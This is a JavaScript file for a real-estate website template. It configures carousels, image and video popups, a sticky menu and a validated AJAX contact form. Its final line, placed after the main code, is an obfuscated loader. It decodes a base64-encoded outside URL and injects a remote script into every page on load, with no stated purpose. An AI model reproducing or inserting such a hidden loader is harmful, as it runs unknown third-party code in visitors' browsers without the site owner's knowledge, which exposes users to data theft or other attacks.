/*Copyright (c) 2017 Himanshu Softtech.
------------------------------------------------------------------
[Master Stylesheet]

Project:  Single Property
Version:  1.0.0
Assigned to:  ---
-------------------------------------------------------------------
*/

$(document).ready(function (){

    // slider section

    var owl = $('.pi_slider_wrapper .owl-carousel');

      // Carousel initialization
      owl.owlCarousel({
          loop:true,
          margin:0,
          autoplay:true,
          mouseDrag: false,
          nav:false,
          dots:false,
          items:1
      });


      // add animate.css class(es) to the elements to be animated
      function setAnimation ( _elem, _InOut ) {
        // Store all animationend event name in a string.
        // cf animate.css documentation
        var animationEndEvent = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';

        _elem.each ( function () {
          var $elem = $(this);
          var $animationType = 'animated ' + $elem.data( 'animation-' + _InOut );

          $elem.addClass($animationType).one(animationEndEvent, function () {
            $elem.removeClass($animationType); // remove animate.css Class at the end of the animations
          });
        });
      }

    // Fired before current slide change
      owl.on('change.owl.carousel', function(event) {
          var $currentItem = $('.owl-item', owl).eq(event.item.index);
          var $elemsToanim = $currentItem.find("[data-animation-out]");
          setAnimation ($elemsToanim, 'out');
      });

    // Fired after current slide has been changed
      owl.on('changed.owl.carousel', function(event) {

          var $currentItem = $('.owl-item', owl).eq(event.item.index);
          var $elemsToanim = $currentItem.find("[data-animation-in]");
          setAnimation ($elemsToanim, 'in');
      })

  // magnific popup

       $('.popup-gallery').magnificPopup({
        delegate: 'a',
        type: 'image',
        gallery:{
          enabled:true
        },
           mainClass: 'mfp-with-zoom', // this class is for CSS animation below

        zoom: {
          enabled: true, 
          duration: 300,
          easing: 'ease-in-out',

          opener: function(openerElement) {
            return openerElement.is('img') ? openerElement : openerElement.find('i');
          }
        }
      });



    // magnific popup
          $('.popup-video').magnificPopup({
          delegate: 'a',
          type: 'iframe',
          tLoading: 'Loading image #%curr%...',
          mainClass: 'mfp-with-zoom',
          gallery: {
            enabled: true,
            navigateByImgClick: true,
            preload: [0,1] // Will preload 0 - before current, and 1 after the current image
          },
          image: {
            tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
            titleSrc: function(item) {
              return item.el.attr('title') + '<small></small>';
            }
          }
        });


    // testimonial slider

    $('.pi_testimonial_wrapper .owl-carousel').owlCarousel({
    loop:true,
    margin:10,
    nav:false,
    autoplay:true,
    dots: true,
    responsive:{
        0:{
            items:1
        },
        600:{
            items:2
        },
        1000:{
            items:3
        }
    }
})


  // Menu js for Position fixed
    $(window).scroll(function(){
      var window_top = $(window).scrollTop() + 2; 
        if (window_top > 1000) {
          $('.pi_navigation_wrapper').addClass('menu_fixed animated fadeInDown');
        } else {
          $('.pi_navigation_wrapper').removeClass('menu_fixed animated fadeInDown');
        }
    });


    //video slider

  var sync1 = $("#sync1");
  var sync2 = $("#sync2");
  var slidesPerPage = 4; //globaly define number of elements per page
  var syncedSecondary = true;

  sync1.owlCarousel({
    items : 1,
    slideSpeed : 2000,
    nav: false,
    autoplay: true,
    dots: false,
    mouseDrag: false,
    loop: true,
    responsiveRefreshRate : 200,
    navText: ['<svg width="100%" height="100%" viewBox="0 0 11 20"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M9.554,1.001l-8.607,8.607l8.607,8.606"/></svg>','<svg width="100%" height="100%" viewBox="0 0 11 20" version="1.1"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M1.054,18.214l8.606,-8.606l-8.606,-8.607"/></svg>'],
  }).on('changed.owl.carousel', syncPosition);

  sync2
    .on('initialized.owl.carousel', function () {
      sync2.find(".owl-item").eq(0).addClass("current");
    })
    .owlCarousel({
    items : slidesPerPage,
    dots: false,
    nav: false,
    autoplay:false,
    mouseDrag: false,
    responsiveRefreshRate : 100
  }).on('changed.owl.carousel', syncPosition2);

  function syncPosition(el) {
    //if you set loop to false, you have to restore this next line
    //var current = el.item.index;
    
    //if you disable loop you have to comment this block
    var count = el.item.count-1;
    var current = Math.round(el.item.index - (el.item.count/2) - .5);
    
    if(current < 0) {
      current = count;
    }
    if(current > count) {
      current = 0;
    }
    
    //end block

    sync2
      .find(".owl-item")
      .removeClass("current")
      .eq(current)
      .addClass("current");
    var onscreen = sync2.find('.owl-item.active').length - 1;
    var start = sync2.find('.owl-item.active').first().index();
    var end = sync2.find('.owl-item.active').last().index();
    
    if (current > end) {
      sync2.data('owl.carousel').to(current, 100, true);
    }
    if (current < start) {
      sync2.data('owl.carousel').to(current - onscreen, 100, true);
    }
  }
  
  function syncPosition2(el) {
    if(syncedSecondary) {
      var number = el.item.index;
      sync1.data('owl.carousel').to(number, 100, true);
    }
  }
  
  sync2.on("click", ".owl-item", function(e){
    e.preventDefault();
    var number = $(this).index();
    sync1.data('owl.carousel').to(number, 300, true);
  });



  // ajax
  $("#submit").click(function(){
      var name = $('#name').val();
      var email = $('#email').val();
      var website = $('#website').val();
      var phone = $('#phone').val();
      var message = $('#message').val();
      var letters = /^[A-Za-z]+$/;
      var number = /^[0-9]+$/;
      var mail_letters = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;

      if (name != "" && phone != "" && email != ""  && website != ""  && message != "") {
          if(name.match(letters)) { 
              if(phone.match(number) && phone.length <= 10) {
                  if(email.match(mail_letters)){
                      $.ajax({
                      method : 'post',
                      url : './assets/ajax.php',
                      data :  {'user_name' : name ,
                                'phone_number' : phone,
                                'email' : email,
                                'message' : message,
                                'website' : website,
                                },
                     }).done(function(resp){
                         if( resp == 1){
                              document.getElementById("error").style.color = "green";
                             document.getElementById("error").innerHTML = "Mail Send Successfully";
                              $('#name').val('');
                             $('#phone').val('');
                             $('#email').val('');
                             $('#website').val();
                             $('#message').val('');
                         }else{
                              document.getElementById("error").style.color = "red";
                              document.getElementById("error").innerHTML = "Mail not Send";
                         }
                     console.log(resp); });
                
                  }else{
                      document.getElementById("error").style.color = "red";
                      document.getElementById("error").innerHTML = "Please Fill The  Correct Mail Id";
                  }
              }else{
                  document.getElementById("error").style.color = "red";
                  document.getElementById("error").innerHTML = "Please Fill The  Correct Number";
              }
          }else
          {   document.getElementById("error").style.color = "red";
              document.getElementById("error").innerHTML = "Please Fill The Correct Name";
          }   
      }else{
          document.getElementById("error").style.color = "red";
          document.getElementById("error").innerHTML = "Please Fill All Detail";
      }
  });

});

var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);

